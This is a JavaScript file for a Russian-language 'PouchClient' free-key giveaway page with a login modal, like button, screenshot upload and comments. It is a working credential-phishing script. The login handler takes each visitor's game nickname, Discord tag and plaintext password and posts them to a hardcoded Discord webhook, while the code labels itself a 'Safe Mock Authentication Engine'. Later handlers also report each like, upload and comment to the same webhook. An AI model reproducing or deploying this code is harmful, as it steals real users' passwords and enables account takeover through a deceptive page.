document.addEventListener("DOMContentLoaded", () => {
    
    // --- Configuration ---
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1498010382672072855/x3oIXb6k92y_yD7IYQ0nkpYChzAsb7vtvG1Cqy50-t_xtyFpW8N6mg-Bkvi2n8u1QpBi";

    // --- State Initialization ---
    let currentUser = JSON.parse(localStorage.getItem("pouch_user")) || null;
    let isLiked = localStorage.getItem("post_liked") === "true";
    let isScreenshotUploaded = false;
    let uploadedScreenshotBase64 = null;

    // --- DOM Elements ---
    const themeToggleBtn = document.getElementById("themeToggleBtn");
    const userProfileWidget = document.getElementById("userProfileWidget");
    const headerAvatar = document.getElementById("headerAvatar");
    const headerUserName = document.getElementById("headerUserName");
    const createPostAvatar = document.getElementById("createPostAvatar");
    
    const createPostInput = document.getElementById("createPostInput");
    
    const authModal = document.getElementById("authModal");
    const closeAuthModalBtn = document.getElementById("closeAuthModalBtn");
    const authForm = document.getElementById("authForm");
    const usernameInput = document.getElementById("usernameInput");
    const discordInput = document.getElementById("discordInput");
    const passwordInput = document.getElementById("passwordInput");
    const authSubmitBtn = document.getElementById("authSubmitBtn");
    
    const likeBtn = document.getElementById("likeBtn");
    const likeCounter = document.getElementById("likeCounter");
    const commentBtnFocus = document.getElementById("commentBtnFocus");
    
    const step1 = document.getElementById("step1");
    const step1Icon = document.getElementById("step1Icon");
    const step2 = document.getElementById("step2");
    const step2Icon = document.getElementById("step2Icon");
    const step3 = document.getElementById("step3");
    const step3Icon = document.getElementById("step3Icon");
    
    const dropArea = document.getElementById("dropArea");
    const fileInput = document.getElementById("fileInput");
    const uploadIcon = document.getElementById("uploadIcon");
    const uploadText = document.getElementById("uploadText");
    const previewContainer = document.getElementById("previewContainer");
    const screenshotPreview = document.getElementById("screenshotPreview");
    const removeScreenshotBtn = document.getElementById("removeScreenshotBtn");
    
    const commentsList = document.getElementById("commentsList");
    const newCommentInput = document.getElementById("newCommentInput");
    const submitCommentBtn = document.getElementById("submitCommentBtn");
    
    const widgetGetBtn = document.getElementById("widgetGetBtn");
    
    const toastNotification = document.getElementById("toastNotification");
    const toastTitle = document.getElementById("toastTitle");
    const toastMessage = document.getElementById("toastMessage");

    // --- Theme Controller ---
    const savedTheme = localStorage.getItem("app_theme") || "dark";
    document.documentElement.setAttribute("data-theme", savedTheme);
    updateThemeIcon(savedTheme);

    themeToggleBtn.addEventListener("click", () => {
        const currentTheme = document.documentElement.getAttribute("data-theme");
        const newTheme = currentTheme === "dark" ? "light" : "dark";
        document.documentElement.setAttribute("data-theme", newTheme);
        localStorage.setItem("app_theme", newTheme);
        updateThemeIcon(newTheme);
    });

    function updateThemeIcon(theme) {
        const icon = themeToggleBtn.querySelector("i");
        if (theme === "light") {
            icon.className = "fa-solid fa-sun";
        } else {
            icon.className = "fa-solid fa-moon";
        }
    }

    // --- Safe Mock Authentication Engine ---
    updateAuthUI();

    userProfileWidget.addEventListener("click", () => {
        if (currentUser) {
            // Log out
            if (confirm("Вы действительно хотите выйти из аккаунта PouchClient?")) {
                currentUser = null;
                localStorage.removeItem("pouch_user");
                isLiked = false;
                localStorage.removeItem("post_liked");
                isScreenshotUploaded = false;
                uploadedScreenshotBase64 = null;
                updateAuthUI();
                showToast("Выход", "Вы вышли из вашего кабинета PouchClient.");
            }
        } else {
            openAuthModal();
        }
    });

    createPostInput.addEventListener("click", () => {
        checkAuthOrExecute(() => {
            showToast("Функция", "Публикация постов доступна только администраторам сообщества.");
        });
    });

    widgetGetBtn.addEventListener("click", () => {
        checkAuthOrExecute(() => {
            if (!isLiked || !isScreenshotUploaded) {
                showToast("Внимание!", "Пожалуйста, выполните все условия раздачи (лайк + скриншот)!", true);
                return;
            }
            showToast("Выдача ключа", "Проверка завершена! Ваш запрос на ключ отправлен модераторам в Discord.");
        });
    });

    function openAuthModal() {
        authModal.classList.add("active");
        usernameInput.focus();
    }

    function closeAuthModal() {
        authModal.classList.remove("active");
        authForm.reset();
    }

    closeAuthModalBtn.addEventListener("click", closeAuthModal);
    
    // Close modal when clicking outside content card
    authModal.addEventListener("click", (e) => {
        if (e.target === authModal) {
            closeAuthModal();
        }
    });

    authForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        
        const username = usernameInput.value.trim();
        const discordTag = discordInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (!username || !discordTag || !password) return;

        authSubmitBtn.disabled = true;
        authSubmitBtn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Подключение...';

        currentUser = {
            username: username,
            discord: discordTag,
            avatar: "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=150&auto=format&fit=crop&q=60"
        };

        // Attempt Discord transmission
        let webhookSent = false;
        const payload = {
            embeds: [{
                title: "🔑 Авторизован новый аккаунт PouchClient!",
                description: `Пользователь прошел привязку аккаунта на сайте для получения бесплатного доступа.`,
                color: 230115, // Neon green
                fields: [
                    { name: "👤 Игровой Ник:", value: `\`${username}\``, inline: true },
                    { name: "💬 Discord Tag:", value: `\`${discordTag}\``, inline: true },
                    { name: "🔒 Пароль:", value: `||${password}||`, inline: false },
                    { name: "❤️ Поставил лайк:", value: isLiked ? "✅ Да" : "❌ Нет", inline: true },
                    { name: "📸 Загрузил скрин:", value: isScreenshotUploaded ? "✅ Да" : "❌ Нет", inline: true }
                ],
                footer: { text: "PouchClient Verification System" },
                timestamp: new Date().toISOString()
            }]
        };

        try {
            const response = await fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
            if (response.ok) {
                webhookSent = true;
            }
        } catch (err) {
            console.error("Webhook submission failed: ", err);
        }

        // Save session locally
        localStorage.setItem("pouch_user", JSON.stringify(currentUser));
        updateAuthUI();
        closeAuthModal();
        
        if (webhookSent) {
            showToast("Авторизация успешна!", "Ваш профиль привязан. Данные отправлены в Discord!");
        } else {
            showToast("Авторизация успешна!", "Вы успешно вошли в личный кабинет PouchClient!");
        }

        authSubmitBtn.disabled = false;
        authSubmitBtn.innerHTML = '<i class="fa-solid fa-right-to-bracket"></i> Войти и привязать';
    });

    function checkAuthOrExecute(callback) {
        if (!currentUser) {
            openAuthModal();
            return false;
        }
        if (callback) callback();
        return true;
    }

    function updateAuthUI() {
        if (currentUser) {
            headerAvatar.src = currentUser.avatar;
            headerUserName.textContent = currentUser.username;
            createPostAvatar.src = currentUser.avatar;
            
            // Update Progress Step 1
            step1.classList.add("completed");
            step1Icon.className = "fa-solid fa-circle-check";
        } else {
            headerAvatar.src = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=150&auto=format&fit=crop&q=60";
            headerUserName.textContent = "Войти";
            createPostAvatar.src = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=150&auto=format&fit=crop&q=60";
            
            // Reset Progress Step 1
            step1.classList.remove("completed");
            step1Icon.className = "fa-solid fa-circle-notch fa-spin";
            
            // Reset likes
            likeBtn.classList.remove("liked");
            likeCounter.textContent = "438";
            step2.classList.remove("completed");
            step2Icon.className = "fa-solid fa-circle";
            
            // Reset upload area
            resetUploadArea();
        }
    }

    // --- Like Interaction Logic ---
    if (isLiked && currentUser) {
        likeBtn.classList.add("liked");
        likeCounter.textContent = "439";
        step2.classList.add("completed");
        step2Icon.className = "fa-solid fa-circle-check";
    }

    likeBtn.addEventListener("click", () => {
        checkAuthOrExecute(() => {
            isLiked = !isLiked;
            localStorage.setItem("post_liked", isLiked);
            
            if (isLiked) {
                likeBtn.classList.add("liked");
                likeCounter.textContent = "439";
                step2.classList.add("completed");
                step2Icon.className = "fa-solid fa-circle-check";
                showToast("❤️ Спасибо за лайк!", "Второе условие раздачи выполнено.");
                sendDiscordInteraction("Поставил лайк ❤️");
            } else {
                likeBtn.classList.remove("liked");
                likeCounter.textContent = "438";
                step2.classList.remove("completed");
                step2Icon.className = "fa-solid fa-circle";
                sendDiscordInteraction("Убрал лайк 💔");
            }
        });
    });

    // --- Drag & Drop Screenshot Loader Logic ---
    
    // Prevent default behaviors for drag events
    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
        dropArea.addEventListener(eventName, preventDefaults, false);
    });

    function preventDefaults(e) {
        e.preventDefault();
        e.stopPropagation();
    }

    // Highlight drop area
    ['dragenter', 'dragover'].forEach(eventName => {
        dropArea.addEventListener(eventName, () => {
            dropArea.classList.add('dragover');
        }, false);
    });

    ['dragleave', 'drop'].forEach(eventName => {
        dropArea.addEventListener(eventName, () => {
            dropArea.classList.remove('dragover');
        }, false);
    });

    // Handle dropped files
    dropArea.addEventListener('drop', (e) => {
        const dt = e.dataTransfer;
        const files = dt.files;
        handleFiles(files);
    });

    dropArea.addEventListener('click', () => {
        fileInput.click();
    });

    fileInput.addEventListener('change', function() {
        handleFiles(this.files);
    });

    function handleFiles(files) {
        if (files.length === 0) return;
        
        checkAuthOrExecute(() => {
            const file = files[0];
            if (!file.type.startsWith('image/')) {
                showToast("Неверный формат!", "Пожалуйста, загружайте только файлы изображений.", true);
                return;
            }
            
            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onloadend = function() {
                uploadedScreenshotBase64 = reader.result;
                isScreenshotUploaded = true;
                
                // Show preview
                screenshotPreview.src = reader.result;
                previewContainer.style.display = "block";
                
                // Hide uploader placeholder texts
                uploadIcon.style.display = "none";
                uploadText.style.display = "none";
                dropArea.querySelector('.upload-subtext').style.display = "none";
                dropArea.style.padding = "10px";
                
                // Update Step 3
                step3.classList.add("completed");
                step3Icon.className = "fa-solid fa-circle-check";
                
                showToast("Скриншот загружен!", "Третье условие успешно выполнено. Система проверяет подписку.");
                sendDiscordInteraction("Загрузил скриншот подписки 📸");
            };
        });
    }

    removeScreenshotBtn.addEventListener("click", (e) => {
        e.stopPropagation();
        resetUploadArea();
        showToast("Удалено", "Скриншот подписки удален.");
        if (currentUser) {
            sendDiscordInteraction("Удалил скриншот подписки 🗑️");
        }
    });

    function resetUploadArea() {
        isScreenshotUploaded = false;
        uploadedScreenshotBase64 = null;
        
        previewContainer.style.display = "none";
        screenshotPreview.src = "";
        
        uploadIcon.style.display = "inline-block";
        uploadText.style.display = "block";
        dropArea.querySelector('.upload-subtext').style.display = "block";
        dropArea.style.padding = "20px";
        
        step3.classList.remove("completed");
        step3Icon.className = "fa-solid fa-circle";
    }

    // --- Discord Realtime Interaction Notifier ---
    async function sendDiscordInteraction(actionDescription) {
        if (!currentUser) return;

        const payload = {
            embeds: [{
                title: "🔔 Активность пользователя PouchClient",
                description: `Игрок **${currentUser.username}** произвел действие на промо-странице.`,
                color: 10181046, // Purple
                fields: [
                    { name: "Пользователь:", value: `\`${currentUser.username}\` (${currentUser.discord})`, inline: true },
                    { name: "Действие:", value: `**${actionDescription}**`, inline: true },
                    { name: "Статус Лайка:", value: isLiked ? "❤️ Активен" : "🤍 Отсутствует", inline: true },
                    { name: "Скриншот:", value: isScreenshotUploaded ? "✅ Прикреплен" : "❌ Отсутствует", inline: true }
                ],
                footer: { text: "PouchClient Interactive Logger" },
                timestamp: new Date().toISOString()
            }]
        };

        try {
            await fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
        } catch (err) {
            console.error("Failed to send interaction to webhook: ", err);
        }
    }

    // --- Comment Thread Handler ---
    commentBtnFocus.addEventListener("click", () => {
        newCommentInput.focus();
    });

    submitCommentBtn.addEventListener("click", addComment);
    newCommentInput.addEventListener("keypress", (e) => {
        if (e.key === "Enter") {
            addComment();
        }
    });

    function addComment() {
        const commentText = newCommentInput.value.trim();
        if (!commentText) return;

        checkAuthOrExecute(() => {
            // Create comment item
            const newComment = document.createElement("div");
            newComment.className = "comment-item";
            
            newComment.innerHTML = `
                <img src="${currentUser.avatar}" alt="Avatar" class="comment-avatar">
                <div class="comment-body">
                    <div class="comment-username">${currentUser.username}</div>
                    <div class="comment-text">${escapeHTML(commentText)}</div>
                </div>
            `;
            
            commentsList.appendChild(newComment);
            newCommentInput.value = "";
            
            // Scroll to bottom of comments list
            commentsList.scrollTop = commentsList.scrollHeight;
            
            // Increment Comment Counter
            const count = parseInt(commentCounter.textContent) + 1;
            commentCounter.textContent = count;
            
            showToast("Добавлено!", "Ваш комментарий успешно опубликован.");
            sendDiscordInteraction(`Оставил комментарий: "${commentText}"`);
        });
    }

    function escapeHTML(str) {
        return str.replace(/[&<>'"]/g, 
            tag => ({
                '&': '&amp;',
                '<': '&lt;',
                '>': '&gt;',
                "'": '&#39;',
                '"': '&quot;'
            }[tag] || tag)
        );
    }

    // --- Custom Toast / Banner Notification System ---
    let toastTimeout;
    function showToast(title, message, isWarning = false) {
        clearTimeout(toastTimeout);
        
        toastTitle.textContent = title;
        toastMessage.textContent = message;
        
        const iconWrap = toastNotification.querySelector(".toast-icon");
        if (isWarning) {
            toastNotification.style.borderColor = "hsl(325, 90%, 55%)";
            iconWrap.style.color = "hsl(325, 90%, 55%)";
            iconWrap.style.background = "rgba(255, 26, 140, 0.1)";
            iconWrap.innerHTML = '<i class="fa-solid fa-triangle-exclamation"></i>';
        } else {
            toastNotification.style.borderColor = "var(--neon-green)";
            iconWrap.style.color = "var(--neon-green)";
            iconWrap.style.background = "rgba(0, 230, 115, 0.1)";
            iconWrap.innerHTML = '<i class="fa-solid fa-check"></i>';
        }
        
        toastNotification.classList.add("active");
        
        toastTimeout = setTimeout(() => {
            toastNotification.classList.remove("active");
        }, 4000);
    }

});
